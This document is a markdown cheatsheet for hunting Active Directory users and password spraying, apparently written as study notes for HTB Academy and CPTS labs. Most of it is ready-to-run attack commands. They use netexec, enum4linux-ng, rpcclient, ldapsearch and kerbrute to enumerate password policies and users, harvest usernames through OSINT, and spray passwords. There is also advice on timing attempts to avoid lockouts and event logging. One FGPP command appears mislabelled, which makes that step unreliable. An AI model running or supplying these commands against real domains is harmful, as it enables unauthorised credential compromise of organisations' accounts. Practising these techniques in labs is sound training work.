# AD User Hunting & Password Spraying Cheatsheet

## 1. Enumerate the Password Policy First

> `crackmapexec` is dead — use **netexec (nxc)**, the actively maintained fork. Syntax is nearly identical.

**Credentialed:**
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' --pass-pol
```

**Null session / anonymous:**
```bash
nxc smb <DC_IP> -u '' -p '' --pass-pol
```

**Check for null session / anon bind + signing status in one shot:**
```bash
nxc smb <DC_IP>
# Look for "signing:False" (relay potential) in output
```

**`enum4linux` is unmaintained — use `enum4linux-ng`** (Python rewrite, JSON/YAML export, cleaner output):
```bash
enum4linux-ng -P <DC_IP> -oA output
```

**rpcclient (still solid, no replacement needed):**
```bash
rpcclient -U "" -N <DC_IP>
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

**LDAP anonymous bind:**
```bash
ldapsearch -H ldap://<DC_IP> -x -b "DC=domain,DC=local" -s sub "*" | grep -i -A5 pwdHistoryLength
```

### ⚠️ Fine-Grained Password Policies (FGPP)
The domain-wide policy above can be overridden per-OU/group on 2008+ domains. A target group might have a stricter (or looser) policy than the default. This is the thing most people skip — and exactly why they lock out accounts the "default" policy said were safe.

```bash
# nxc module
nxc ldap <DC_IP> -u <user> -p '<pass>' -M get-desc-users

# PowerView
Get-DomainFineGrainedPasswordPolicy
```

---

## 2. Build the Target User List

**Null session — nxc pulls users + badpwdcount together (better than enum4linux-ng for this specific job):**
```bash
nxc smb <DC_IP> -u '' -p '' --users
nxc smb <DC_IP> -u '' -p '' --users | grep -v "badpwdcount: [1-9]"   # drop near-lockout accounts
```

**LDAP anonymous — skip `windapsearch` (unmaintained, Python2-era). Use `ldapsearch` or `bloodhound-python`:**
```bash
ldapsearch -H ldap://<DC_IP> -x -b "DC=domain,DC=local" "(&(objectclass=user))" sAMAccountName | grep sAMAccountName
```

**Kerbrute — still the best stealth option.** No bad-pwd-count increment on enum, no Event 4625, only triggers 4768 (and only if Kerberos event logging is explicitly enabled via GPO, which most orgs don't bother with):
```bash
kerbrute userenum -d domain.local --dc <DC_IP> /opt/jsmith.txt -o valid_users.txt
```

**No internal foothold at all — OSINT route:**
```bash
python3 linkedin2username.py -c "Company Name" -f "first.last"
```
If LinkedIn scraping is unreliable, cross-check the naming convention against metadata pulled from public PDFs/Office docs:
```bash
exiftool *.pdf
```
(This is how orgs leak their randomized-GUID username schemes — classic and still effective.)

---

## 3. Spray

**Kerbrute (preferred — pre-auth spray, doesn't trip 4625; still counts toward lockout threshold, so timing discipline still applies):**
```bash
kerbrute passwordspray -d domain.local --dc <DC_IP> valid_users.txt 'Welcome1'
```

**netexec (nxc) — standard spray against SMB:**
```bash
nxc smb <DC_IP> -u valid_users.txt -p 'Welcome1' --continue-on-success
```

`--continue-on-success` keeps the run going past the first hit instead of stopping — important when you want every valid credential pair, not just one. Chain `--shares` onto a follow-up run against confirmed creds to immediately check access.

---

## 4. OPSEC / Lockout Math

| Policy field | What it means for you |
|---|---|
| Lockout threshold | # of attempts you can burn before risking a lockout |
| Lockout observation window | Reset timer for badpwdcount — space sprays by this + buffer |
| Lockout duration | If you DO lock someone out, how long till auto-unlock |

**Formula:** (threshold − 1) attempts per window, then wait the full window + a few minutes buffer.

**No policy obtainable:** one hail-mary attempt, or one spray every few hours. Log everything — target accounts, DC used, password(s) tried, date/time — so you can cross-reference if the client flags suspicious logons.

---

## What changed vs. the old-school (HTB Academy module) version
- `crackmapexec` → `netexec` (CME is no longer maintained; nxc is the community successor, actively developed, more modules)
- `enum4linux` → `enum4linux-ng` (better parsing, structured output, actually maintained)
- `windapsearch` → dropped; `ldapsearch` / `bloodhound-python` cover the same ground more reliably
- Added FGPP check — commonly tested in CPTS labs because the "safe" domain policy can lie to you if a stricter per-group policy applies
